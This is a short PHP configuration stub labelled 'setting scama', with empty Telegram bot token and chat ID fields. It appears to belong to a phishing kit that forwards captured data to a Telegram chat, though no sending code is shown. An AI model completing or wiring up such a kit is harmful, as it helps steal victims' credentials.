<?php
// setting scama

$botToken=""; // Bot Token Telegram
$chatId="";  // ChatId Telegram

?>